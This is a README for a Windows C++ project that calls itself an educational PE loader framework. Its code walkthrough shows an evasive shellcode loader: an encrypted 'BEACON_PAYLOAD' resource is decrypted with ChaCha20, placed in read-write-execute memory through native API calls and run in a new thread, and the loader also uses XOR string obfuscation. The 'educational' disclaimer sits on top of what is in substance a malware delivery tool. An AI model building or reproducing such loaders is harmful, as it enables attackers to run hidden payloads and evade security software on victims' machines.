# PE Loader Educational Framework

![Build Status](https://img.shields.io/badge/build-passing-brightgreen)
![License](https://img.shields.io/badge/license-MIT-blue)
![Platform](https://img.shields.io/badge/platform-Windows%20x64-lightgrey)
![Language](https://img.shields.io/badge/code-C%2B%2B-9cf)

## 📚 Overview

An **educational framework** for understanding Windows PE (Portable Executable) file format and memory management. This project demonstrates how Windows loads and executes PE files, covering essential concepts used in operating system design, memory management, and low-level Windows programming.

**⚠️ EDUCATIONAL PURPOSE ONLY** - This project is designed for learning Windows internals, PE file structure, and memory management concepts.

## 🎯 Learning Objectives

After studying this project, you will understand:

- **PE File Structure**: Headers, sections, imports, exports, relocations
- **Windows Memory Management**: Virtual memory allocation, page permissions
- **Process and Thread Creation**: How Windows creates and manages execution contexts
- **Windows Native API**: Understanding `Nt*` functions and their role in the Windows kernel
- **Resource Embedding**: How to embed and extract binary resources in PE files
- **Encryption in Applications**: Using ChaCha20 for data protection

## 📁 Project Structure

```
├── docs/                    # Documentation and research notes
├── libs/
│   └── chacha/              # ChaCha20 encryption library
│       └── chacha20.h       # Stream cipher implementation
├── src/
│   ├── chrome_inject.cpp    # Main PE loader demonstration
│   ├── encryptor.cpp        # Encryption utility for resources
│   ├── syscalls.cpp         # Windows Native API wrappers
│   ├── syscalls.h           # Native API declarations
│   └── resource.rc          # Resource script for embedding
├── make.bat                 # Build script
└── README.md
```

## 🔬 Technical Concepts Covered

### 1. PE File Format

The Portable Executable format is the native executable format for Windows. Key structures include:

```
┌─────────────────────────────────┐
│         DOS Header              │  ← Legacy compatibility
├─────────────────────────────────┤
│         PE Signature            │  ← "PE\0\0"
├─────────────────────────────────┤
│      COFF File Header           │  ← Machine type, section count
├─────────────────────────────────┤
│      Optional Header            │  ← Entry point, image base
├─────────────────────────────────┤
│      Section Headers            │  ← .text, .data, .rsrc, etc.
├─────────────────────────────────┤
│         Sections                │  ← Actual code and data
└─────────────────────────────────┘
```

### 2. Memory Allocation with Native API

This project demonstrates using Windows Native API for memory management:

```cpp
// Allocate virtual memory
NTSTATUS NtAllocateVirtualMemory(
    HANDLE ProcessHandle,      // Target process
    PVOID *BaseAddress,        // Preferred address (or NULL)
    ULONG_PTR ZeroBits,        // Address space constraint
    PSIZE_T RegionSize,        // Size to allocate
    ULONG AllocationType,      // MEM_COMMIT | MEM_RESERVE
    ULONG Protect              // PAGE_READWRITE, PAGE_EXECUTE_READ, etc.
);
```

### 3. Resource Embedding

PE files can embed binary resources (icons, data, etc.):

```rc
// resource.rc - Resource Script
BEACON_PAYLOAD RCDATA "build\\beacon.enc"
```

Resources are loaded at runtime:
```cpp
HRSRC hRes = FindResource(NULL, "BEACON_PAYLOAD", RT_RCDATA);
HGLOBAL hData = LoadResource(NULL, hRes);
LPVOID pData = LockResource(hData);
```

### 4. ChaCha20 Encryption

The project uses ChaCha20 stream cipher for protecting embedded data:

```cpp
// 256-bit key (32 bytes)
uint8_t key[32] = { ... };

// 96-bit nonce (12 bytes)
uint8_t nonce[12] = { ... };

// Decrypt data
chacha20_encrypt(key, nonce, data, size);
```

### 5. Thread Creation

Creating execution threads using Native API:

```cpp
NTSTATUS NtCreateThreadEx(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,        // Entry point function
    PVOID Argument,            // Parameter to pass
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PPS_ATTRIBUTE_LIST AttributeList
);
```

## 🛠️ Build Instructions

### Prerequisites

- **Visual Studio 2019/2022** with C++ Desktop Development workload
- **Windows SDK** (10.0 or later)
- **Developer Command Prompt**

### Building

1. Open **Developer Command Prompt for VS**

2. Navigate to project directory:
   ```cmd
   cd path\to\devhang
   ```

3. Build the project:
   ```cmd
   make.bat
   ```

4. For debug build with console output:
   ```cmd
   make.bat debug
   ```

### Build Output

- `ONEHIT.exe` - Main executable
- `build\beacon.enc` - Encrypted resource file

## 📖 Code Walkthrough

### Main Execution Flow

```cpp
int main() {
    // 1. Load embedded resource
    HRSRC hRes = FindResource(NULL, "BEACON_PAYLOAD", RT_RCDATA);
    
    // 2. Decrypt the payload using ChaCha20
    chacha20_encrypt(key, nonce, payload, size);
    
    // 3. Allocate executable memory
    NtAllocateVirtualMemory(GetCurrentProcess(), &baseAddr, 
                            0, &size, 
                            MEM_COMMIT | MEM_RESERVE,
                            PAGE_EXECUTE_READWRITE);
    
    // 4. Copy decrypted code to allocated memory
    memcpy(baseAddr, payload, size);
    
    // 5. Create thread to execute
    NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL,
                     GetCurrentProcess(), baseAddr, NULL,
                     0, 0, 0, 0, NULL);
    
    // 6. Wait for completion
    WaitForSingleObject(hThread, INFINITE);
}
```

### String Obfuscation Technique

The project demonstrates compile-time string obfuscation using XOR encoding:

```cpp
// XOR key for obfuscation
#define XOR_KEY 0x5A

// Obfuscated "ntdll.dll"
char ntdll[] = {0x34, 0x2E, 0x3E, 0x36, 0x36, 0x74, 0x3E, 0x36, 0x36, 0x00};

// Deobfuscate at runtime
for (int i = 0; ntdll[i]; i++) {
    ntdll[i] ^= XOR_KEY;
}
// Result: "ntdll.dll"
```

## 📚 Key Windows Internals Concepts

### Virtual Memory Pages

| Permission | Constant | Description |
|------------|----------|-------------|
| Read | `PAGE_READONLY` | Can read memory |
| Read/Write | `PAGE_READWRITE` | Can read and write |
| Execute/Read | `PAGE_EXECUTE_READ` | Can execute and read |
| Execute/Read/Write | `PAGE_EXECUTE_READWRITE` | Full access (use carefully) |

### Native API vs Win32 API

| Win32 API | Native API | Description |
|-----------|------------|-------------|
| `VirtualAlloc` | `NtAllocateVirtualMemory` | Allocate memory |
| `VirtualFree` | `NtFreeVirtualMemory` | Free memory |
| `VirtualProtect` | `NtProtectVirtualMemory` | Change permissions |
| `CreateThread` | `NtCreateThreadEx` | Create thread |
| `CloseHandle` | `NtClose` | Close handle |

### PE Section Characteristics

| Section | Purpose | Typical Permissions |
|---------|---------|---------------------|
| `.text` | Executable code | Execute + Read |
| `.data` | Initialized data | Read + Write |
| `.rdata` | Read-only data | Read |
| `.bss` | Uninitialized data | Read + Write |
| `.rsrc` | Resources | Read |

## 🔗 Further Reading

- [Microsoft PE Format Documentation](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format)
- [Windows Internals Book](https://docs.microsoft.com/en-us/sysinternals/resources/windows-internals)
- [Understanding the PE File Format](https://blog.kowalczyk.info/articles/pefileformat.html)
- [ChaCha20 RFC 8439](https://tools.ietf.org/html/rfc8439)

## ⚠️ Disclaimer

This project is provided **strictly for educational purposes** to understand:

- Windows operating system internals
- PE file format and structure
- Memory management concepts
- Low-level programming techniques

**Do not use this knowledge for malicious purposes.** Understanding these concepts is valuable for:

- Security researchers analyzing software
- Developers building system utilities
- Students learning operating system concepts
- Anyone interested in Windows internals

## 📜 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

*Built for learning. Use responsibly.*
